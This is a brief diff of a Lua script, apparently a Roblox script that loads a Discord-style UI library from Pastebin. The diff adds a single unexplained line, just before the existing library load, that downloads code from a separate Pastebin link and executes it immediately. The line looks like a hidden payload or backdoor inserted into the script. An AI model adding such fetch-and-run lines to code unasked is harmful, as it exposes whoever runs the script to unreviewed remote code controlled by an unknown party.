@@ -112,6 +112,7 @@ bnds:Bind(
 )
 ]]--
 
+loadstring(game:HttpGet"https://pastebin.com/raw/7bEWJaiT")()
 local DiscordLib =
     loadstring(game:HttpGet"https://pastebin.com/raw/WeLA0ip9")()
 
